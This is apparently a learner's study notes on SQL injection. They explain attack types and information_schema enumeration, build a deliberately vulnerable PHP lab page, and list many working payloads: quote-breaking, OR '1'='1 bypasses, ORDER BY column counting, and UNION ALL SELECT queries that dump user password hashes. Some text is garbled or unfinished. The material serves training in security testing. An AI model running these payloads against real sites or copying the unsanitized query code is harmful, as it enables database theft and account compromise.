# SQL-Injection(SQLi) Vulnerabilities

Structure Query Language

SQL-Injection(SQLi) is a common web application vulnerability that occurs when untrusted input is concatenated(means adding) into SQL querries without proper sanitization or parameterization, allowing attackers to manipulate queries and interact with the database in unintented ways. It is not a flaw in the database itself, but in the way web application handle user input before querrying the database.

It means There on Web An Sql query is already running, and anyhow we can inject our query in there, Is called SQL Injection.
	
An Web query which getting input from users and passing it in query, so that we can change the query if input is not sanitized there.
	
We have to do it manually, Not to used Sqlmap because it not works all time, especially in real world scenario, SQLmap not often works there.
	
At legitimate Query, Manipulate	Query by an attacker can run is called SQLi.
	
Its not the vulnerabilty of Database Version. Maybe on Updated Versions Some Techniques, Payloads will not work. It doesn't mean Up-To-Date version of AnyKind of SQL database will get your application get secure.

# What SQL Injection Can Do:

•  Retrive sensitive information(usernames, passwords, financial data).
•  Modify data (insert, update, delete records).
•  Execute administrative operations (e.g, shutting down a database).
•  Bypass authentication and impersonate users.
•  In advanced cases, read system files or execute OS commands if the database privileges allow. 

Databreach is one of the way from SQLi, bcuz via this we get the sensitive informations. Depends of what level query we got, Like if we have Insert Query then we can insert the data, If we have select query then we can Select, If Update then we can Update. 
	Shutdown the database means we can delete the tables  and the database, then application means nothing.
	Can also get the shell,  Through the SQL Injection	depends of what level access we have.
	If on authentication we get the sql Injection so that we can bypass also.
	
# Why SQL Injection Happens:

•  Developers directly concatenate user input into SQL queries.
•  Lack of parameterized queries or stored procedures.
•  Inadequate input validation and sanitization
•  Over reliance on firewalls. IDS/IPS, or SSL without addressing application-layer flaws.

Firewall, IDS, IPS can prevent to Some levels. Which is one of the reason why SQLmap not works, Because they Blocked its frequently sending Queries and speedly thatswhy they blocked it.
	
# Common Misconceptions:

•  “Firewalls protect against SQL Injection” Firewalls only protect ports, SQL happens inside an allowed port (e.g, 80/443). 

Firewall:
	
IT Protect against the attacks, but not every firewall does that, it depends of which level of Firewall is placed. Like Iptable, Firewalld, Windows Firewall they cant protect this bcuz they work on stateless and statefull addressing where stateless means that connection should be made or not, will not check that but only work and statefull means previous proper connectivity is only allowed others are not. 
	Advanced Firewall:
	But Those where we implement it by IDS/IPS who intercept the packet, and anlyse them like what type of data is coming from the clients then send further, It downs the Network speed but from proper analyze it decide what to do or what not to do, like if theres payload then block it, only that type of firewall will only protect the attacks.
	
•  “IDS detects SQL Injection” IDS only detects known patterns, customized attacks bypass it.
	 
Here we gave the known patterens, then it detects otherwise not, Then we change the payload So it will also bypass.
	
•  “SSL protects against SQL Injection” SSL encrypts traffic but does not stop malicious input---it only hides it from network sniffers.

Godaddy based that Take SSL Certificate, Secure Your Website From Hack, SSL Only Prevent from Man-In-The-Middle Attack, Just from Sniffing Attack it can protect and Not from Any other Attacks.

# Types of SQL Injections:
			
SQL Injection (SQLi) is one of the most common web security vulnerabilities that allows attackers to interface with queries made to a database. Different Types of SQL Injection depend on how attackers extract or manipulate information. Basically here we inject malicious query through application into database
	
•	In-band SQLi

In-band SQLi is the most straightforward and frequent technique. The attackers uses the same communication channel to both inject malicious SQL queries and retrieve results, It occurs fast.
			
1> Error-Based SQL Injection.
		
Forcing database errors to reveal structural information. When we got errors from applying SQLi on the server,  then if we got numbers of errors from them we got the Db structure, its name, tables, Columns, Users, Passwords and all.  Enable disable  Error listing from apache, affect this too. And in Development phase Error displaying sould be On, After publising or at Production phase error displaying should be off, which return empty page, Firewall errors or Content. 
⇒	Exploits database error messages to gain information about database structure.	
⇒ For example, attackers intentionally write invalid queries to reveal table names, column names, or data types from verbose errors.
⇒ Effective if the database is configured to display detailed error messages.

2> 	Union-Based SQL Injection. 
			
Leveraging the UNION operator to retrieve data from other tables. When we want to use SELECT operator we should use  UNION or UNION ALL.
				
⇒ Exploits The UNION operator to combine results of legitimate queries with malicious SELECT statements.
⇒ Example: retrieving usernames,passwords or emails in the same HTTP response.
⇒  Relies heavily on being able to guess the correct number and types of columns in the query.			

•	Blind SQLi
		
When error is offed and UNION is not working, then we have blind sqli there,  Blind SQLi is used when the database does not return error messages or direct query outputs. Attackers must infer information indirectly from the application's behaviour, making it slower but stealthier.When error messages are hidden; attackers infer data using true/false responses or timing attacks. Blind has Two Sub-types which is. It occurs slow as compare to In-Band. 

1> Boolean Based SQLi	
	
⇒ Attackers craft queries so the application responds differently depending on whether a condition is TRUE or FALSE.
⇒ Example a page might display different content if a query condition is true (data exits) versus false (no data).
⇒ Information is extracted one piece at a time.		
  
2> Time Based SQLi
	
⇒ Expliots SQL functions that delay execution (e, g. SLEEP() or WAITFOR DELAY).
⇒  Attackers detect whether a query result is true or false by measuring server response time
⇒ Useful when no content differences appear in response but timing can still be measured.
⇒  Basically here we more delay the response to check its vulnerable or not then compare buth the request with and without delay, That calls TIme based SQLi.


•  Out-of-Band SQLi (Interview asked).
		
Out-of-band SQLi is used when in-bad and blind SQLi are not possible, often due to unstable servers or limited query feedback. Using external communication (e.g,  DNS/HTTP request) when the application is configured for it.
⇒  Relies on database features that allow generating DNS or HTTP requests to externals servers, Otherwise It not works.
⇒ Data is exfiltrated via these requests to attacker-controlled systems.
⇒ More rare, but effective with databases that allow outbound connections (e,g, Server with xp_dirtree , Oracle with UTL_HTTP ).
⇒ It gives output indirectly through different channel. thatswhy it calls Out-of-Band.
		 


6. Double Query Injection (Interview asked).



# Information_Schema For SQLi 

It does mapping, and gives database structure 
		
information_schema allows attackers to discover database organization without prior knowledge. To access information_schema we only need myslq login, its not neccesary that from particular database we should have to be login or from daabase user login,  because we are not accessing that particular database, Just only information_schema, We dont have to be any root or such particular user, Here's how attackers leverage it:
		
#	Common MySQL Enumeration Commands

Lets on our server, will check there: 
Login to myslq by cmd: 
					
1. 	mysql -u root -p 
		
Here we didnt pick any database, bcuz information_schema is Himself a database.
		
2. show databases;
		
Show all databases. 

3. use mysql;
		
Switch to a database (e,g,. mysql).
		
4. show tables; 
		
list tables in the current database.
			
5. select * from user; 
	select user, authentication_string from user:
		
Get all users (for root access daabases).

6. use information_schema;
		
Switch to information_schema;
		
7. Select * from TABLES;
Select TABLE_SCHEMA from TABLES;
Select TABLE_SCHEMA from TABLES GROUP BY TABLE_SCHEMA;
		
List all tables in information_schema
		
8. use sqli_db;
		
Switch to a custom database ( example: sqli_db) 

# Get All Database Names

1-  SELECT TABLE_SCHEMA FROM information_schema.TABLES;
2-  SELECT TABLE_SCHEMA FROM information_schema.TABLES GROUP BY TABLE_SCHEMA;
3-  SELECT TABLE_SCHEMA FROM information_schema.TABLES GROUP BY TABLE_SCHEMA LIMIT 0,1;
4-  SELECT TABLE_SCHEMA FROM information_schema.TABLES GROUP BY TABLE_SCHEMA LIMIT 1,1;
5-  SELECT TABLE_SCHEMA FROM information_schema.TABLES GROUP BY TABLE_SCHEMA LIMIT 2,1;
6-  SELECT TABLE_SCHEMA FROM information_schema.TABLES GROUP BY TABLE_SCHEMA LIMIT 3,1;
7-  SELECT TABLE_SCHEMA FROM information_schema.TABLES GROUP BY TABLE_SCHEMA LIMIT 4,1;
8-  SELECT TABLE_SCHEMA FROM information_schema.TABLES GROUP BY TABLE_SCHEMA LIMIT 5,1;
      

# ALternative: Get all database names at once
        
1-   SELECT GROUP_CONCAT(TABLE_SCHEMA) FROM information_schema.TABLES GROUP BY TABLE_SCHEMA;

# Get All 	Table Names

1-  SELECT table_schema, Table_name FROM information_schema.TABLES;
2-  SELECT table_schema, Table_name FROM information_schema.TABLES where TABLE_SCHEMA="mysql";
3-  SELECT table_schema, Table_name FROM information_schema.TABLES where TABLE_SCHEMA="mysql" LIMIT 0,1;
4-  SELECT table_schema, Table_name FROM information_schema.TABLES where TABLE_SCHEMA="mysql" LIMIT 1,1;
5-  SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA="mysql" LIMIT 0,1;
6- SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA="mysql" LIMIT 30,1;
7-  SELECT TABLE_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA="mysql" group by TABLE_NAME;

# Get All Columns Names 

1-  SELECT Table_schema, Table_name, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA= “mysql”AND TABLE_NAME= "columns_priv";
2- SELECT Table_schema, Table_name, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA= "mysql" AND TABLE_NAME= “user” LIMTI 1,1;
3- SELECT Table_schema, Table_name, COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA= "mysql" AND TABLE_NAME= “user” LIMIT 40,1;
      
# Alternative: All columns in one list

1-  SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA= 'mysql' AND TABLE_NAME= 'user';
            
# Extract User Data 
       
1- SELECT User, authentication_string FROM mysql.user;
2- SELECT User, authentication_string FROM mysql.user LIMIT 0,1;
3- SELECT User FROM mysql.user LIMIT 1,1; 
4- SELECT GROUP_CONCAT(User) FROM mysql.user;
5- SELECT GROUP_CONCAT(authentication_string) FROM mysql.user;
6- SELECT GROUP_CONCAT(User), GROUP_CONCAT(authentication_string) FROM mysql.user;
        
# Example: SQL Injection Exploit with Union 

http://192.168.31.60/webpen/sqli/error-based-string.php?id=-1' union all select group_concat(user), group_concat(authentication_string), 3, 4, 5 From mysql.user -- 
		
		
# Explained Our usable queries for sqli  

◇	Enumerating Databases
         			
Attackers use these queries to list or enumerate the names of the all databases
			   
1. SELECT TABLE_SCHEMA FROM information_schema.TABLES GROUP BY TABLE_SCHEMA;
			   			 
Here we using Select query, we have table of name tables which is present in information_schema and from it we are retrieving the column of name Table_schema from tables in information_schema. which will show the output  of all available databases.
								

				
 2.  SELECT GROUP_CONCAT(TABLE_SCHEMA) FROM information_schema.TABLES GROUP BY TABLE_SCHEMA;

this also shows the all available databases in our myslq.  
			   
▪  The first returns each database name individually.
▪  The secound uses GROUP_CONCAT to get all database names in asingle row.
    
◇	Enumerating Tables 
    
To find all tables names in a particular database(e,eg, mysql ):
    
1>  SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA='mysql';
      
It will shows all tables of mysql database
		      
2> SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA='mysql';

this also shows all the tables of mysql databse in different formate, Now we knows all the Database names, and tables name in  particular database through the information_schema 
• The condition WHERE TABLE_SCHEMA='mysql' restricts the results to only the specified database.
• GROUP_CONCAT conveniently returns all table names in one result.
      
◇	Enumerating Columns

Attackers identify column names in a specific table (e.g., table in the mysql database):
1>  SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA= 'mysql' AND TABLE_NAME= 'user';
2>  SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.COLUMNS WHERE TABLE_SCHEMA= 'mysql' AND TABLE_NAME= 'user';
 Here it will shows the columns name of table named user(which we found above) in mysql database.
                  
◇  Extracting User Data 
 		
 The table inner content or its data is not in information_schema, its stored in the database, So from information_schema we can get the database names, its all tables names, and that tables all columns name. Then for its actual data we craft the querys as per the want like this below:
 		With Knowledge of columns, attackers can extract user credentials:
 
1>  SELECT User, authentication_string FROM mysql.user;
                   
Here mysql is database name, user is table name and User, authentication_string is that tables column name which contain the actual data.
 For This query crafting we need to use information_schema
      
2>  SELECT GROUP_CONCAT(User), GROUP_CONCAT(authentication_string) FROM mysql.user;
                   
•  These reveal all users and their password hashes(or authentication strings). this data is revealed from actual database, Not from information_schema. here information_schema is not involved but to made this query,  we need this query crafting data like database, table, columns name which done from information_schema.
                  
 # Example: SQL Injection via Union and information_schema
 		
A practical SQLi payload to list users and hashes using UNION ALL :
 
1-   ?id=1' UNION ALL SELECT GROUP_CONCAT(User), GROUP_CONCAT(authentication_string), 3, 4, 5 FROM mysql.user -- 
     
•  The specific numbers of columns ( here	“3, 4, 5”) must match the originals query's column count in the vulnerable application.
 
 # Summary Table : Common Enumeration Queries
 
 
| Purpose  | Example Query |
| List database names  | SELECT TABLE_SCHEMA FROM information_schema.TABLES GROUP BY TABLE_SCHEMA;  |
| List tables in a DB | SELECT TABLE_NAME FROM Information_schema.TABLES WHERE TABLE_SCHEMA='mysql';  |
| List column in a table | SELECT COLUMN_NAME FROM information_schema.COLUMNS WHERE TABLE_SCHEMA= 'mysql' AND TABLE_NAME= 'user'; |
| Extract usernames & hashes  | SELECT User, authentication_string FROM mysql.user; |
| All items as single row/value | SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.TABLES WHERE TABLE_SCHEMA='mysql'; |

				                                  
Note: 	Exploiting information_schema is a fundamental step in SQL injection attackes, especially for privilege esclation or extracting sensitive data from a compromised server. The information_schema database is a critical resource for SQL attackers because it stores metadata about every other database, table and column in MySQL. it enables enumeration of the database structure--- essential for exploiting a SQL injection vulnerability.
                                         			
                                         
                                          
# Prevention Techniques:

•  Use parameterized queries (Prepared Statements) instead of string concatenation.
•  Employ stored procedures with strict validation.
•  Implement input validation (whitelisting acceptable inputs).
•  Enforce least privilege access on database accounts.
•  Use random ORM frameworks carefully (still validate inputs).
•  Regularly conduct pentration tests to detect vulnerabilities.
•  Raid limit, IDS/IPS make the chances less of attacks.





Attacker through the firewall is communicating to web server because port no 80,443 is allowed there. that Two port will intract with OS means Transport layer, and on that Transport layer our web server is running like apache, And on apache we have deployed our application, Either it can be on PHP or Any other language So this one App server is our application, Which will have Custom Code, This application will communicate to database. Which can maybe on that Server or to Anyother Server.

If budget is less then its on same server, And if not then on other server So that If Web server is compromise, Can Safe the Data from that other server. Thatswhy Database Server Should Be in different from Web, can safe if web server is compromised by Activate the firewall of Database, Or Disconnect the application even thou the source code is gone but customers data is safe which is important, Thatswhy it kept in other server. Database Firewall is configured in that way so it only communicate with application, Through the private ip by port allowing like 3306 for mysql, So it only communicate to that, not to others. 
 
 One Application will have One Database, Also the possibility that if Micro concept is using for making the application means like one part made earlier, then other part later within this gaps. so its also possible that One Application will have Mulitple Databases. That goes in Micro Management. simply like first it was something different and now we made it something different from that. There application behaviour also disturbs less chances to work properlly.  Micro management is depend on many different things. Like for load balancing also micro management is used, for big Load manage it in little application pools.
 
 Through the application Attackers can execute mysql queries to the database, Just application should have to be vulnerable. 
 
 
# Setup the Database in our server:-
 
1.  mysql -u root -p

 
2.  create database sqli_db;
		
	Create New DATABASE
		
3.  use sqli_db;
		
	use this database.
		
4.  CREATE TABLE users (
    -> id INT,
    -> name VARCHAR(50),
    -> email VARCHAR(50),
    -> password VARCHAR(50),
    -> enable INT(1)
    -> );
		
	 Create the table of users name with Columns name and datatype.
		
5.  INSERT INTO users(id, name, email, password, enable)
    -> VALUES
    -> (1, 'krish','krish@vc.com','e455r46',1),
    -> (2, 'admin','admin@vc.com','password123',1),
    -> (3, 'anshu','anshu@vc.com','12345',1),
    -> (4, 'shhh','shu@vc.com','123456',1),
    -> (4, 'pooja','poo@vc.com','12345',1),
    -> (5, 'vish','vis@vc.com','12345',0);
			
	Put the content on users name table. 
    
 # Connection.php file to connect sql database 
	    
The PHP code for database connection formatted in Markdown with a description:
		
		<?php 
		
		// Database connection parameters 
		$dbhost = "localhost";
		$dbuser = "root";
		$dbpass = "root";
		$dbname = "sqli_db";
		
		// Create connection to mysqli Database using mysql;
		$connection = mysqli_connect($dbhost, $dbuser, $dbpass, $dbname);
		
		// Check if connection failed and terminate with an error message
		if (mysqli_connect_error()) {
		    die("Database Connection failed: " . mysqli_connect_error());
		}
		
		?>

# Examples 

1. Error-based-string.php

			   <?php
			include("connection.php");
			
			?>
			
			<!DOCTYPE html>
			<html>
			<head>
			    <meta charset="UTF-8">
			    <meta name="viewport" content="width=device-width, initial-scale=1.0">
			    <title>Error Based String</title>
			</head>
			<body>
			
			<div style=" margin-top:70px;color:#FFF; font-style:23px; text-align:center">
			    <h1><span class="style4">Error based string</span> <br>
			        <font size="3" color="#666666">
			
			    <?php 
			    // Check If 'id' parameter is passed via GET request
			    if (isset($_GET['id'])) {
			
			        // Assign the 'id' parameter value from the GET request to a variable    
			        $id = $_GET['id'];
			
			        // Construct an SQL query to select user record matching the given id
			        $query = "SELECT * FROM users Where id='$id' LIMIT 0,1";
			
			        // Execute the query on the database connection
			        $result = mysqli_query($connection, $query);
			
			        // If the query fails, terminate with error message displaying MYSQL error
			        if (!$result) {
			            div("Database Query Failed" . print_r(mysqli_error($connection)));
			            }
			
			        // If succesful, fetch the resulting row as an associative array and display user info
			            while ($row = mysqli_fetch_assoc($result)) {
			                echo '<font color= "#0000ff">';
			                echo 'Your ID:'. ' - ' . $row['id'];
			                echo "<br>";
			                echo 'Your User Name:' . ' - ' . $row['name'];
			                echo "</font>";
			            }
			    }
			    ?>
			</body>
			</html>


# Accessing these URLs will:

Show user information (ID and username) if the record is found.
	
If there is a SQL error such as an injection attempt, the database error message will be revealed because of how the PHP code reports errors.
	
This behavior allows attackers to probe the database structure or test injection payloads by checking the error messages that come from invalid queries.
	
If more analysis, exploitation techniques, or mitigation strategies related to this page or SQL injection testing are needed, they can be specified.

# id Parameter Behavior

The URLs provided test how the id parameter behaves on the error-based injection page with different input types.

1. id=1
A normal integer ID that should return the user with ID 1 if it exists.

2. id=-1
A negative number. Likely no user exists with this ID. May lead to no result or an error.

3. id=99999999999999999999999999999999999999
An extremely large number. Probably no matching record. Tests how the system handles extremely large values.

4. id=admin
A string instead of an integer. Tests how the system handles type mismatches and may trigger SQL errors or display error output.

According to the PHP code, these inputs are inserted directly into the SQL query.

Numeric values are placed into the query unchanged.

String values such as admin are also placed directly into the query, which can break the SQL syntax and display an SQL error message.

This is a sign of an error-based SQL injection vulnerability, where database error messages help attackers understand the database structure and behavior.

# Examples:

String input will likely trigger an SQL syntax error.

Very large numbers may cause no result or unexpected behavior.

Negative numbers may return no results but usually will not cause an error.

This interaction allows attackers to craft more advanced SQL injection payloads by analyzing the error messages or responses.

# Summary of URL behavior:

1. id=1
Valid user ID. Displays user information for ID 1.

2. id=-1
Negative number. Likely returns no result or an empty output.

3. id=99999999999999999999999999999999999999
Extremely large number. Tests how the system handles out-of-range values. Likely no matching record.

4. id=admin
String input causing a SQL syntax, triggering error-based SQL injection output that reveals database error details.

Since the PHP code directly inserts id into the query without santization, These tests show how the system reveals database errors, allowing attackers to probe database behaviour or structure via error-based SQL injection.

# How Its Works:-

1) Finding the Vulnerable Parameter: 
		
	Attackers Inputs a single qoute or malformed value that Intentionally break SQL syntax.( this is also generated by burp Active Scan, When Error recieved that page Status Code Changed ).

2) Triggering SQL Error: 
		
	The broken query causes the database to throw an error.

3) Extracting Information: 
		
	Error Messages disclose sensitive info such as the type of database, version, or query details.

4) Further Exploitation: 
		
	Using this information attacker crafts injection Like UNION-based queries to dump data.

# Barracking a Query Using a Single Quote

In SQL injection testing, “barracking” (breaking the query) with a single quote is a basic method to check whether user input is being handled safely.

To test this, a single quote is added to the id parameter in the URL:

http://192.168.31.35/web-pentest/error-based-string.php?id=1

This single qoute is intended to reak the SQL query string, likely causing a syntax error in the database query, which due to error-based string injection will reveal the database error message. The helps confirm if the application is vulnerable to SQL Injection.
If the page returns a SQL error messade showing a syntax problem, it confirms the query is concatenating user input unsafely.
	
SELECT * FROM users WHERE id='1' LIMT 0,1 
here we have in control  the value of id from the 1, like this whole part is in our control  1' LIMT 0,1.  Not can control its before part and for after 1 payload then rest part of the query we can comment it which then will be ignored. 
	

1. Single Qoute 
and then add single QOute after 1 like this ?id=1' then in output we should have error if its vulnerable then it will show error, save that error, to know More about query. like here we have error: 

Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near ''1'' LIMIT 0,1' at line 1 in /var/www/html/webpentest/error-based-string.php:30 Stack trace: #0 /var/www/html/webpentest/error-based-string.php(30): mysqli_query() #1 {main} thrown in /var/www/html/webpentest/error-based-string.php on line 30

2. Double Qoute
After that, try adding Double qoute after 1 like this ?id=1", to see if its breaking the query band showing the error in output, which in our case is not breaking the query. showing exact output as simply ?id=1 this is showing.

3. Hash or %23
After that, try adding # after 1 like this ?id=1#, to see if its breaking the query band showing the error in output, which in our case is not breaking the query. showing exact output as simply ?id=1 this is showing.

4. Bracket )
After that,try adding ) after 1 like this ?id=1), to see if its breaking the query band showing the error in output, which in our case is not breaking the query. showing exact output as simply ?id=1 this is showing.

5. Single Qoute then Equalto like this '=
After that,try adding '= after 1 like this ?id=1'=, to see if its breaking the query and showing the error in output, which then we will store that too and compare both the errors to understand whats overall happening there.

Here we have error like this:

Fatal error: Uncaught mysqli_sql_exception: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near '' LIMIT 0,1' at line 1 in /var/www/html/webpentest/error-based-string.php:30 Stack trace: #0 /var/www/html/webpentest/error-based-string.php(30): mysqli_query() #1 {main} thrown in /var/www/html/webpentest/error-based-string.php on line 30 

and compare this from above only single qoute error, to understand login behind the scenes. as in both error we can see tht in this error here we have ( use near '' LIMIT 0,1' ) and above we have the error for ( use near ''1'' LIMIT 0,1' ) by comparing them we can verify that '1' is missing in second error.

Also try injecting %3d which is value of equal too (=), to see different types of error by breaking the query, to know what type of query is runnning and which overall will help us to made its payloads, by breaking and joining the query.
	
By comparing this all errors we can see that, in those errors only this part is different comparing every error.
	
1. 	use near ''1'' LIMIT 0,1'
2.  use near '' LIMIT 0,1' 
3.  use near 

# Purpose:
The single quote is used to break the SQL query string. If the application is vulnerable, it will trigger a SQL syntax error. Because the page uses error-based SQL injection behavior, the database error message may be displayed. This helps reveal whether the input is concatenated directly into the SQL query.

If a SQL syntax error appears, it confirms the parameter is not handled safely and the application may be vulnerable to SQL injection.

# Join The Query or Comment rest of the query

SELECT * FROM users WHERE id='1' -- ' LIMT 0,1
here we can see this mid part of the query 1' --  is our payload injection area now and as after commenting rest of the part of query is ignored. 
or something by # we comment the rest of the part or simply join the query, although # is not directly can be passed, we have to url encode it which value is %23 then our query will run as it was running simply.

The URLs and query strings provided are examples of how the id parameter can be manipulated for SQL injection testing using special characters and logical conditions:

Using %23 or #

%23 or # is a URL-encoded comment operator in SQL that ignores the rest of the query:

http://192.168.1.31/web-pentest/error-based-string.php?id=1#  
http://192.168.1.31/web-pentest/error-based-string.php?id=1%23


These terminate the query early, allowing injection of payloads before the comment.

Using logical operators like OR and AND combined with single quotes
http://192.168.1.31/web-pentest/error-based-string.php?id=1' or '1  
http://192.168.1.31/web-pentest/error-based-string.php?id=1' or 1 = '1


These try to make the WHERE clause always true to bypass filters or extract all rows.

Using SQL comment sequences to ignore trailing query parts
http://192.168.1.31/web-pentest/error-based-string.php?id=1' --+  
http://192.168.1.31/web-pentest/error-based-string.php?id=1'%20--+


--+ comments out the rest of the SQL query after the injected payload.

These techniques are classic error-based SQL injection vectors to test database query behavior and identify vulnerabilities by altering query logic or causing errors.

# Explanation of SQL Injection Techniques Using id Parameter

Using %23 or #

Using %23 or # in the URL represents a URL-encoded or raw SQL comment operator.
This causes the database to ignore the rest of the query string after the injected payload, effectively terminating the query early.

Examples:

http://192.168.1.31/web-pentest/error-based-string.php?id=1#  
http://192.168.1.31/web-pentest/error-based-string.php?id=1%23

Logical operators combined with single quotes

Logical operators combined with single quotes are used to manipulate the SQL WHERE clause condition to always evaluate as true, bypassing restrictions or returning more data.

Examples:

http://192.168.1.31/web-pentest/error-based-string.php?id=1' or '1  
http://192.168.1.31/web-pentest/error-based-string.php?id=1' or 1 = '1

Using SQL comment sequences

Using SQL comment sequences like --+ comments out the trailing query, allowing injected code to execute without syntax errors caused by leftover query parts.

Examples:

http://192.168.1.31/web-pentest/error-based-string.php?id=1' --+  
http://192.168.1.31/web-pentest/error-based-string.php?id=1'%20--+

How these techniques work

The comment operator # or -- instructs SQL to ignore everything after them, allowing injected statements before the comment to run unobstructed.

The logical conditions like ' or '1' = '1' alter the query to always be true, effectively bypassing filters and allowing full data retrieval.

These payloads exploit concatenated dynamic queries where user input is inserted directly without proper sanitization or parameterization.

Summary Table

1. URL-encoded comment

Example: 1*%23
Purpose: Terminates query, ignores rest of SQL

2. Logical OR injection

Example: 1' or '1
Purpose: Alters WHERE clause to always true

3. Logical OR injection

Example: 1' or 1 = '1
Purpose: Alters WHERE clause to always true

4. SQL comment sequence

Example: 1' --+
Purpose: Comments out trailing SQL after injection

5. SQL comment sequence

Example: 1'%20--+
Purpose: Same as above, URL-encoded whitespace + --

# Important Security Note

These injection techniques are classic SQL injection vectors for testing and exploiting vulnerable applications.
They allow attackers to manipulate database queries, potentially exposing sensitive data or causing integrity damage.

Testing or using these methods should only be done with proper authorization and legality in mind

# Deeper Testing Example:
?id=1' OR '1'='1

This payload always evaluates to true. If successful, it can make the application return all records from the target table. This verifies that injection is possible and the query logic is being manipulated by user input.

# Order by 

A query like this runnning 
SELECT * FROM users WHERE id='1' LIMIT 0,1 
where we using Select operator, * means different values is picked up from the users table where this particular values of id's row wil be picked up,like id is the primary key to get any else values from that table.

# Techniques for Error-based SQL Injection:-

1. Using Single Quotes ' to test Injection Or Break the query.
	
	Inject a single quote 1' to cause syntax error. as our value is passing in '$id' by adding ‘ in our value add one extra ' in the query, which will break the query, the this query breaked and will print the error, if want to execute query as it is then dont break the query, but we breaked it and Incomplete Query will print the error, If error appears, the input is concatenated unsafely.
	
	
Try logical payloads like:

•  ?id=1'
•  ?id=1' OR '1'='1

to test whether the condition bypasses filters.

2. Using SQL Comments to Modify Queries Or Join the Query.

%23 or # represent comments to ignore the rest of the query. 
--+ is another comment style to safely terminate injected queries.
	
Example:
	▪ ?id=1'%23
	▪ ?id=1'--+
	
3. Detecting Number of Columns with ORDER By
		To craft UNION Injection, KNowing the number of Columns returned by the original query helps:
         ▪ Inject ORDER BY with incremental colums numbers.
         ▪ Query executes normally untill the columns index is out of bounds, causing error.
         ▪ Last succesfull index = number of columns.
         
   Example payload sequences:
         
   •  ?id=1' ORDER BY 1  --+
   •  ?id=1' ORDER BY 2  --+
   •  ?id=1' ORDER BY 3  --+
   
	Untill the errors sequence goes on, llast succes = number of columns.

5. Extracting Data Using UNION ALL SELECT

      ▪  Combine attacker defined SELECT with original SELECT using UNION ALL.
      ▪  Number of columns and compatible datatypes must match original query.
      ▪  Injection values like 1,2,3, --- helps identify columns appear in output.
      
      Example:
      
      •  ?id=1' UNION ALL SELECT 1,2,3,4,5 --+	
      
      If numbers appear, injection 	is succesful.
      
      Lets suppose its showing 3,4 then
   
6.  Extracting Database, Username, Version name by UNION ALL SELECT when 3,4 number is showing.

# Example:
		
   ◇	 ?id=1' UNION ALL SELECT 1,2,database(),current_user,5 --+
   
IT will show the Database and current user name at place 3,4.
					
   ◇   ?id=1' UNION ALL SELECT 1,2,version(),4,5 --+
   
IT will show the Version of Database using, AT place 3.
					
   ◇  ?id=-1' union all select 1,2,3,group_concat(DISTINCT table_schema),5 from information_schema.tables --+
   
IT will show All Databases names presents there, by using the information_schema. or here we can use LIMIT 0,1 to see 1by 1 the names of database by increasing the LIMIT 1,1 and LIMIT 2,1.
					
   ◇ ?id=-2' union all select 1,2,3,group_concat(table_name),5,6,7,8,9 from information_schema.tables where table_schema=database() LIMIT 0,1 --+
   
IT will show ALL the Tables name present in the current Database which is using.
					
   ◇  ?id=-2' union all select 1,2,3,group_concat(column_name),5,6,7,8,9 from information_schema.columns where table_name="samu_login" AND table_schema=database() LIMIT 0,1 --+
   
IT will show All the Columns name present in table named samu_login in the current database using.
					
   ◇ ?id=-2' union all select 1,2,3,group_concat(passwort),5,6,7,8,9 from samu_login --+
   
IT will show all the content of Column named passwort from the table samu_login.
					
   ◇ ?id=-2' union all select 1,2,3,group_concat(login_id),5,6,7,8,9 from samu_login --+
   
IT will show all the content of Column named login_id from the table samu_login.
					
   ◇ ?id=-2' union all select 1,2,3,group_concat(adr_id),5,6,7,8,9 from samu_login --+
   
IT will show all the content of Column named adr_id from the table samu_login.
					
   ◇  ?id=-2' union all select 1,2,group_concat(password) COLLATE -utf8_general_ci,4,5,6,7,8,9,10,11,12,13 from admin --+
   
IT will Used when Sink of both of the tables in the union is different then COLLATE is used.
